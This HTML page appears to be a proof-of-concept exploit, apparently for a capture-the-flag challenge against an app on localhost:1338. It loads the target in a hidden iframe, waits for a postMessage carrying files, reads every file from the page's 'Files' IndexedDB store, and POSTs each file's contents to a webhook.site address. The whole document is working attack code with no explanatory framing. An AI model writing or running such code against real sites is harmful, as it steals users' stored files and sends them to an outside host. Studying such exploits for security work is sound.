<!DOCTYPE html>
<html>
  <body>
    <iframe id="main" src="http://localhost:1338/" style="display:none"></iframe>
    <script>
      window.addEventListener("message", (event) => {
        if (event.data?.files?.length > 0) {
          // Wait a second for it to be stored
          setTimeout(() => {
            const openRequest = indexedDB.open("Files", 1);

            openRequest.onsuccess = () => {
              const db = openRequest.result;
              const tx = db.transaction("files", "readonly");
              const store = tx.objectStore("files");

              const getAll = store.getAll();
              getAll.onsuccess = () => {
                const results = getAll.result;
                for (const entry of results) {
                  const file = entry.file;
                  const reader = new FileReader();
                  reader.onload = function () {
                    fetch("https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df", {
                      method: "POST",
                      headers: { "Content-Type": "text/plain" },
                      body: reader.result
                    });
                  };
                  reader.readAsText(file);
                }
              };
            };
          }, 1000); // Give some time to store
        }
      });
    </script>
  </body>
</html>
